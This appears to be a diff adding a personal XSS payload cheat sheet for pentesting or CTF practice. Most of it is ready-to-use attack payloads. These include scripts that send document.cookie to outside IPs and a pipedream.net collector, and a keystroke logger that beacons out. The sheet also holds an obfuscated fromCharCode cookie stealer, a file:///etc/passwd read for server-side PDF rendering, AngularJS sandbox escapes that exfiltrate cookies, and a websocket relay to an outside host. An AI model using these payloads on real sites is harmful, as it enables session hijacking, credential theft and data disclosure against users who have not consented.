@@ -1,0 +1,96 @@
+### xss ###
+## link
+# https://book.hacktricks.xyz/pentesting-web/xss-cross-site-scripting
+# https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection
+# https://tryhackme.com/room/xssgi
+
+
+## event
+document.getElementById("clickMe").onclick = grabCookie;					# add 1 event only
+document.getElementById("clickMe").addEventListener("click", grabCookie);			# could add more event
+
+
+## xss cookie
+<script>window.location='http://10.8.98.114/?cookie='+document.cookie</script>
+<img src="javascript:'http://10.8.98.114/log/'+document.cookie" />
+<script>fetch('http://10.8.98.114/?cookie='+btoa(document.cookie));</script>			# with base64
+
+
+## xss onerror
+<img src="blah" onerror=alert("Hello") />
+<img src="blah" onerror=confirm("Hello") />
+<img src="blah" onerror=window.location='http://51.255.174.252:8000/?cookie='+document.cookie />
+<img src="blah" onerror=alert(JSON.stringify(document.documentElement)) />
+
+
+## xss other
+<script>fetch('/some_page.php?some_param=some_value');</script>					 # call other page
+<script>document.onkeypress=function(e){fetch('http://10.8.98.114/?key='+btoa(e.key));}</script> # key logger
+<script>user.changeEmail('attacker@hacker.thm');</script>					 # call other fn
+
+
+## xss blind
+https://xsshunter.com/
+
+
+## xss polyglot
+jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */onerror=alert('THM') )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert('THM')//>\x3e
+
+
+## mass filtering
+# http://www.jsfuck.com/
+<details/open/ontoggle=window[String.fromCharCode(108,111,99,97,116,105,111,110)][String.fromCharCode(104,114,101,102)]
+	=String.fromCharCode(104,116,116,112,58,47,47,101,111,122,112,112,98,121,49,53,99,98,51,113,104,97,46,109,46,112,105,112,101,100,114,101,97,109,46,110,101,116,47,63,116,61,88,88,88)
+	+document[String.fromCharCode(99,111,111,107,105,101)]>
+
+
+## xss server side (like html to pdf converter)
+# https://book.hacktricks.xyz/pentesting-web/xss-cross-site-scripting/server-side-xss-dynamic-pdf
+<img src="x" onerror="document.write('test')" />						# basic test
+<img src="http://eozppby15cb3qha.m.pipedream.net/" />						# got request ?
+
+
+## get a file and write it
+<script>
+x=new XMLHttpRequest;
+x.onload=function(){document.write(btoa(this.responseText))};
+x.open("GET","file:///etc/passwd");x.send();
+</script>
+
+
+## inside tags attribute
+">< img [...]
+" autofocus onfocus=alert(1) x="
+href="javascript:alert(1)"
+
+
+## AngularJS XSS
+{{7*7}}
+{{constructor.constructor("alert(1)")()}}
+{{constructor.constructor("window.location.href=`http://eozppby15cb3qha.m.pipedream.net/?t=`.concat(btoa(document.cookie));")()}}
+
+
+## Web socket
+<script>
+websocket = new WebSocket('ws://ctf15.root-me.org/ws')
+websocket.onopen = start
+websocket.onmessage = handleReply
+function start(event) {
+  websocket.send("flag");                                                        
+}
+function handleReply(event) {
+  fetch('http://102.113.210.39:4444/?t='+event.data, {mode: 'no-cors'})
+}
+</script>
+
+
+
+
+
+
+
+
+
+
+
+
